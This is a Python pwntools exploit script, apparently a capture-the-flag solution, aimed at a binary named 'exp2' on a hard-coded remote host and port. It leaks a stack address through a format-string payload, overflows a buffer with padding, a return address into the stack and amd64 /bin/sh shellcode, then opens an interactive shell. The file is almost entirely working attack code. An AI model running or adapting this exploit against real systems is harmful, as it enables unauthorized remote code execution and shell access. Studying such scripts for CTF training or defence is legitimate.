#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
~Gros
'''

from pwn import *
import re
import argparse
import subprocess
from binascii import *


context.update(arch='amd64')
BINARY_FILE = '../task/exp2'
REMOTE = ('159.89.21.200', 1339)


def setup_connection():
    binary, libc, preload = None, None, False
    local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
    task_libc = './libc.so.6'

    env = {}
    if args.PRELOAD:
        local_libc = task_libc
        env = {'LD_PRELOAD': task_libc}

    if args.BINARY:
        binary = ELF(BINARY_FILE)
        context.arch = binary.arch

    if args.REMOTE:
        if args.LIBC:
            libc = ELF(task_libc)
        s = remote(*REMOTE)
    else:
        if args.LIBC:
            libc = ELF(local_libc)
        
        s = process(BINARY_FILE, stderr=open('/dev/null', 'w+'), env=env)
        if args.GDB:
            context.terminal = ['gnome-terminal', '-e']
            breakpoints = [0x40071c]
            gdb.attach(s, exe=BINARY_FILE, gdbscript='\n'.join(['b *'+str(x) for x in breakpoints]))
            
    return s, binary, libc


if __name__ == '__main__':
    s, binary, libc = setup_connection()

    shellcode = asm(shellcraft.amd64.sh())

    # leak
    payload = '%6$p.'
    s.recvuntil('Next name, please')
    s.sendline(payload)
    s.recvuntil('Hello ')
    leak = s.recvuntil('.\n')[:-2]
    leak = int(leak, 16)
    leak -= 0xe0
    log.info('Saved rip addr: {}'.format(hex(leak)))

    # shellcode
    s.recvuntil('Next name, please')
    payload = 'A'* 0x28
    payload += p64(leak + 8)
    payload += asm('shr rsp,8\nshl rsp,8')
    payload += shellcode
    s.sendline(payload)

    # trigger
    s.sendline('exit')

    s.interactive()
    s.close()
